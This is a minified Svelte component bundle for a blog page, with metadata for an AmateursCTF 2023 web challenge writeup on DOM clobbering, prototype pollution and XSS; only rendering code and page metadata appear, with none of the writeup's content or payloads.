s,zl,o),p(s,W,o),a(W,ls),a(ls,Ga),p(s,jl,o),p(s,z,o),a(z,Va),a(z,Bs),a(Bs,Ya),a(z,Ja),p(s,Sl,o),p(s,E,o),a(E,Ka),a(E,Ls),a(Ls,Qa),a(E,so),a(E,Hs),a(Hs,lo),a(E,ao),a(E,qs),a(qs,oo),a(E,eo),a(E,Ms),a(Ms,no),a(E,po),p(s,Bl,o),Rs.m(Ue,s,o),p(s,Ws,o),p(s,as,o),ul(N,as,null),p(s,Ll,o),p(s,j,o),a(j,to),a(j,Ns),a(Ns,Fo),a(j,ro),p(s,Hl,o),Us.m(Ze,s,o),p(s,Zs,o),p(s,g,o),a(g,co),a(g,Xs),a(Xs,io),a(g,yo),a(g,Gs),a(Gs,Do),a(g,Eo),p(s,ql,o),Vs.m(Xe,s,o),p(s,Ys,o),p(s,os,o),ul(U,os,null),p(s,Ml,o),p(s,Z,o),a(Z,es),a(es,vo),p(s,Rl,o),p(s,S,o),a(S,fo),a(S,Js),a(Js,ho),a(S,uo),p(s,Wl,o),Ks.m(Ge,s,o),p(s,Qs,o),p(s,ns,o),a(ns,mo),p(s,Nl,o),sl.m(Ve,s,o),p(s,ll,o),p(s,X,o),a(X,ps),a(ps,wo),p(s,Ul,o),p(s,B,o),a(B,Ao),a(B,al),a(al,bo),a(B,go),p(s,Zl,o),ol.m(Ye,s,o),p(s,el,o),p(s,m,o),a(m,_o),a(m,nl),a(nl,Co),a(m,ko),a(m,pl),a(pl,Po),a(m,xo),a(m,tl),a(tl,Oo),a(m,To),p(s,Xl,o),Fl.m(Je,s,o),p(s,rl,o),p(s,ts,o),ul(G,ts,null),p(s,Gl,o),p(s,Fs,o),a(Fs,Io),p(s,Vl,o),p(s,V,o),a(V,rs),a(rs,$o),p(s,Yl,o),p(s,L,o),a(L,zo),a(L,cl),a(cl,jo),a(L,So),p(s,Jl,o),il.m(Ke,s,o),p(s,yl,o),p(s,cs,o),a(cs,Bo),p(s,Kl,o),Dl.m(Qe,s,o),p(s,dl,o),p(s,is,o),a(is,Lo),p(s,Ql,o),El.m(sn,s,o),p(s,vl,o),p(s,ys,o),a(ys,Ho),sa=!0},p:nn,i(s){sa||(ml(R.$$.fragment,s),ml(N.$$.fragment,s),ml(U.$$.fragment,s),ml(G.$$.fragment,s),sa=!0)},o(s){wl(R.$$.fragment,s),wl(N.$$.fragment,s),wl(U.$$.fragment,s),wl(G.$$.fragment,s),sa=!1},d(s){s&&l(D),s&&l(P),s&&l(y),s&&l(bl),s&&l(q),s&&l(gl),s&&l(d),s&&l(_l),s&&ms.d(),s&&l(ws),s&&l(K),s&&l(Cl),s&&As.d(),s&&l(bs),s&&l(O),s&&l(kl),s&&_s.d(),s&&l(Cs),s&&l(T),s&&l(Pl),s&&l(I),s&&l(xl),s&&l(M),s&&l(Ol),s&&l(A),s&&l(Tl),s&&l(ss),Al(R),s&&l(Il),s&&l($),s&&l($l),s&&$s.d(),s&&l(zs),s&&l(b),s&&l(zl),s&&l(W),s&&l(jl),s&&l(z),s&&l(Sl),s&&l(E),s&&l(Bl),s&&Rs.d(),s&&l(Ws),s&&l(as),Al(N),s&&l(Ll),s&&l(j),s&&l(Hl),s&&Us.d(),s&&l(Zs),s&&l(g),s&&l(ql),s&&Vs.d(),s&&l(Ys),s&&l(os),Al(U),s&&l(Ml),s&&l(Z),s&&l(Rl),s&&l(S),s&&l(Wl),s&&Ks.d(),s&&l(Qs),s&&l(ns),s&&l(Nl),s&&sl.d(),s&&l(ll),s&&l(X),s&&l(Ul),s&&l(B),s&&l(Zl),s&&ol.d(),s&&l(el),s&&l(m),s&&l(Xl),s&&Fl.d(),s&&l(rl),s&&l(ts),Al(G),s&&l(Gl),s&&l(Fs),s&&l(Vl),s&&l(V),s&&l(Yl),s&&l(L),s&&l(Jl),s&&il.d(),s&&l(yl),s&&l(cs),s&&l(Kl),s&&Dl.d(),s&&l(dl),s&&l(is),s&&l(Ql),s&&El.d(),s&&l(vl),s&&l(ys)}}}function Fn(Y){let D,u;const k=[Y[0],qe];let P={$$slots:{default:[tn]},$$scope:{ctx:Y}};for(let y=0;y<k.length;y+=1)P=qo(P,k[y]);return D=new pn({props:P}),{c(){fl(D.$$.fragment)},l(y){hl(D.$$.fragment,y)},m(y,w){ul(D,y,w),u=!0},p(y,[w]){const x=w&1?en(k,[w&1&&Le(y[0]),w&0&&Le(qe)]):{};w&2&&(x.$$scope={dirty:w,ctx:y}),D.$set(x)},i(y){u||(ml(D.$$.fragment,y),u=!0)},o(y){wl(D.$$.fragment,y),u=!1},d(y){Al(D,y)}}}const qe={title:"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution",tags:["amateurs-ctf","writeup","sanity","xss","dom-clobbering","prototype-pollution"],categories:["CTF","Writeups"],summary:"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.",created:"2023-07-21T00:00:00.000Z",lastmod:"2023-07-21T00:00:00.000Z",image:"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3",flags:[],updated:"2023-07-26T14:31:26.004Z",slug:"/blog/2023/amateursctf-web-2023-writeup-sanity/+page.md",path:"/blog/2023/amateursctf-web-2023-writeup-sanity",toc:[{depth:2,title:"Introduction",slug:"introduction"},{depth:2,title:"Surface",slug:"surface"},{depth:2,title:"Behind the Scenes",slug:"behind-the-scenes"},{depth:3,title:"DOM Clobbering",slug:"dom-clobbering"},{depth:3,title:"Attacker Server",slug:"attacker-server"},{depth:3,title:"Prototype Pollution",slug:"prototype-pollution"},{depth:4,title:"Proof of Concept (POC)",slug:"proof-of-concept-poc"}]};function rn(Y,D,u){return Y.$$set=k=>{u(0,D=qo(qo({},D),He(k)))},D=He(D),[D]}class dn extends ln{constructor(D){super(),an(this,D,rn,Fn,on,{})}}export{dn as component};
